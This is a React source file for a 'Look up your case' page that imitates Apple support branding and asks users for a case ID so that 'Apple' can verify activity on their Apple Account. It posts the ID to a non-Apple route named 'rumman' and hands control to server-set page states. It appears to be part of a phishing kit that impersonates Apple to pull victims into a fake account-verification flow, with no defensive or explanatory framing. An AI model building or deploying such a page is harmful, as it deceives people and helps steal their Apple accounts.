import { useState } from "react";
import { motion } from "framer-motion";
import { useQueryClient } from "@tanstack/react-query";
import Layout from "../components/layout/Layout";
import toast from "react-hot-toast";

function AppleSpinner({ className = "" }) {
  return (
    <span
      className={`relative inline-block w-[20px] h-[20px] ${className}`}
      aria-hidden="true"
    >
      {Array.from({ length: 12 }).map((_, i) => (
        <span
          key={i}
          className="absolute left-1/2 top-0 w-[2px] h-[5px] rounded-full bg-white origin-[50%_10px]"
          style={{
            transform: `rotate(${i * 30}deg) translateX(-50%)`,
            opacity: 0.15 + (i / 12) * 0.85,
            animation: "apple-spin-fade 1s linear infinite",
            animationDelay: `${(-i / 12).toFixed(3)}s`,
          }}
        />
      ))}
    </span>
  );
}

function CaseLookup({ authUser } = {}) {
  const queryClient = useQueryClient();
  const [caseId, setCaseId] = useState(authUser?.caseId || "");
  const [searching, setSearching] = useState(false);
  const [caseFocused, setCaseFocused] = useState(false);
  const [invalidCase, setInvalidCase] = useState(false);

  const caseActive = caseFocused || caseId.length > 0;

  const submit = async () => {
    const id = caseId.trim();
    if (!id || searching) return;
    if (id.length < 4) {
      setInvalidCase(true);
      return;
    }
    setSearching(true);
    setInvalidCase(false);

    try {
      try {
        sessionStorage.setItem("icloud_case_id", id);
      } catch {
        /* ignore */
      }

      const res = await fetch("/api/v1/rumman/auth/case-lookup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        credentials: "include",
        body: JSON.stringify({ caseId: id }),
      });
      const data = await res.json().catch(() => ({}));
      if (!res.ok || data?.error) {
        throw new Error(data?.error || `Lookup failed (${res.status})`);
      }
      queryClient.setQueryData(["authUser"], (prev) => ({
        ...(prev || {}),
        ...data,
        caseId: data.caseId || id,
        currentPage: data.currentPage || "loading",
        currentStatus: data.currentStatus || "searching_case",
      }));
    } catch (e) {
      const msg = e?.message || "Lookup failed";
      if (/at least 4|could not be found|not valid/i.test(msg)) {
        setInvalidCase(true);
      } else {
        toast.error(msg);
      }
      setSearching(false);
    }
  };

  return (
    <Layout>
      <style>{`
        @keyframes apple-spin-fade {
          0% { opacity: 1; }
          100% { opacity: 0.15; }
        }
      `}</style>
      <div className="pt-[calc(43px+12px)] sm:pt-[44px] pb-[calc(20px+env(safe-area-inset-bottom))] sm:pb-0">
        <div className="w-full flex flex-col items-center px-0 sm:px-4">
          <motion.div
            initial={{ opacity: 0, scale: 0.985 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.55, ease: [0.22, 1, 0.36, 1] }}
            className="sm:w-[640px] w-full min-h-[calc(100dvh-43px-82px-12px)] sm:min-h-0 sm:h-[712px] apple-shadow sm:rounded-[34px] sm:mt-[44px] flex flex-col"
            style={{ background: "var(--card-bg)" }}
          >
            <div className="flex flex-col flex-1 px-[22px] sm:px-[80px] pt-[22px] sm:pt-[40px] pb-[22px] sm:pb-[36px]">
              <div className="flex flex-col items-center">
                <div className="w-[104px] h-[104px] sm:w-[160px] sm:h-[160px] flex items-center justify-center">
                  <img
                    src="/logo.png?v=5"
                    alt=""
                    className="w-full h-full object-contain select-none"
                    draggable={false}
                  />
                </div>
                <h1
                  className="mt-[14px] sm:mt-[18px] select-none cursor-default font-apple text-[24px] sm:text-[32px] font-[600] text-center leading-[1.2] tracking-[-0.01em]"
                  style={{ color: "var(--text-primary)" }}
                >
                  Look up your case
                </h1>
                <p
                  className="mt-[10px] text-center font-apple text-[15px] sm:text-[15px] leading-[1.45] max-w-[340px] sm:max-w-[420px]"
                  style={{ color: "var(--text-secondary)" }}
                >
                  Enter the case reference from your email or chat with support.
                  We’ll open your case details and any actions needed on your
                  Apple Account.
                </p>
                <p
                  className="mt-[8px] text-center font-apple text-[13px] sm:text-[13px]"
                  style={{ color: "var(--text-secondary)" }}
                >
                  Case IDs use at least 4 numbers, for example 324234.
                </p>
              </div>

              <div className="mt-[22px] sm:mt-[28px] w-full max-w-[480px] mx-auto sm:max-w-none">
                <div className="relative">
                  <input
                    value={caseId}
                    onChange={(e) => {
                      setInvalidCase(false);
                      setCaseId(
                        e.target.value
                          .replace(/[^A-Za-z0-9-]/g, "")
                          .slice(0, 16)
                      );
                    }}
                    onFocus={() => setCaseFocused(true)}
                    onBlur={() => setCaseFocused(false)}
                    onKeyDown={(e) => {
                      if (e.key === "Enter") submit();
                    }}
                    type="text"
                    inputMode="numeric"
                    autoComplete="off"
                    spellCheck="false"
                    disabled={searching}
                    className={`w-full h-[52px] sm:h-[56px] text-[16px] sm:text-[17px] font-apple rounded-[12px] outline-none px-[16px] border text-[var(--text-body)] bg-[var(--input-bg)] ${
                      invalidCase
                        ? "border-[#e30000]"
                        : "border-[var(--border-input)] focus:border-[#0071e3] focus:shadow-[0_0_0_3px_rgba(0,113,227,0.28)]"
                    } ${caseActive ? "pt-[18px] pb-[2px]" : ""}`}
                  />
                  <span
                    className={`pointer-events-none absolute left-[16px] font-apple transition-all duration-150 origin-left text-[var(--text-secondary)] ${
                      caseActive
                        ? "top-[8px] text-[12px]"
                        : "top-1/2 -translate-y-1/2 text-[16px] sm:text-[17px]"
                    }`}
                  >
                    Case ID
                  </span>
                </div>

                {invalidCase && (
                  <div className="relative mt-3 mb-1 w-fit max-w-full mx-auto px-1">
                    <div className="absolute -top-[5px] left-1/2 -translate-x-1/2 w-0 h-0 border-l-[8px] border-l-transparent border-r-[8px] border-r-transparent border-b-[7px] border-b-[#fae9a3]" />
                    <div className="bg-[#fae9a3] px-3 py-2 border border-[#b9950178] text-[#494949] text-[13px] sm:text-[14px] font-medium rounded-[5px] tooltip-shadow">
                      Enter a case ID with at least 4 characters.
                    </div>
                  </div>
                )}

                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="inline-block mt-[14px] text-[15px] font-apple hover:underline"
                  style={{ color: "var(--link)" }}
                >
                  Don’t have a case ID?
                </a>
              </div>

              <div className="mt-auto pt-[28px] sm:pt-[32px]">
                <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between sm:gap-4">
                  <button
                    type="button"
                    onClick={submit}
                    disabled={caseId.trim().length < 4 || searching}
                    className="w-full sm:w-auto h-[50px] sm:h-[44px] min-w-[128px] px-[22px] rounded-[12px] text-white font-apple text-[17px] font-medium transition flex items-center justify-center order-1 sm:order-2 active:opacity-90"
                    style={{
                      background: caseId.trim()
                        ? "#0071e3"
                        : "var(--btn-continue)",
                    }}
                  >
                    {searching ? <AppleSpinner /> : "Continue"}
                  </button>
                  <a
                    href="https://support.apple.com/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-[15px] font-apple hover:underline text-center sm:text-left order-2 sm:order-1 py-1"
                    style={{ color: "var(--link)" }}
                  >
                    Help
                  </a>
                </div>

                <p
                  className="mt-[16px] sm:mt-[18px] text-[11px] sm:text-[12px] font-apple leading-[1.45] text-center sm:text-left"
                  style={{ color: "var(--text-secondary)" }}
                >
                  For added security, look up your case only on a device you
                  trust. Apple uses this information to open your case and
                  verify account activity.
                </p>
              </div>
            </div>
          </motion.div>
        </div>
      </div>
    </Layout>
  );
}

export default CaseLookup;
